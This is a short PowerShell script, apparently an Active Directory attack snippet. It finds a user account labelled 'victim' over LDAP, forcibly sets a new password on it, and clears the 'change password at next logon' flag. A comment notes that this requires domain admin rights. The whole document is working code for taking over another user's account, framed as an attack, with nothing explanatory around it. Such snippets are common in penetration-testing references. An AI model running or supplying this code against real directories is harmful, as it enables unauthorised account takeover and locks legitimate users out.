$userSAM = "victim"
$newPassword = "newPassword12!"

$rootDSE = New-Object DirectoryServices.DirectoryEntry("LDAP://RootDSE")
$defaultNamingContext = $rootDSE.Properties["defaultNamingContext"][0]
$searcher = New-Object DirectoryServices.DirectorySearcher
$searcher.SearchRoot = [ADSI]"LDAP://$defaultNamingContext"
$searcher.Filter = "(&(objectCategory=person)(objectClass=user)(sAMAccountName=$userSAM))"
$searcher.PropertiesToLoad.AddRange(@("distinguishedName"))
$user = $searcher.FindOne().GetDirectoryEntry()
$user.Invoke("SetPassword", $newPassword)

# Clears "Change pw at next logon". Requires DA by default
$user.Properties["pwdLastSet"].Value = -1

$user.CommitChanges()
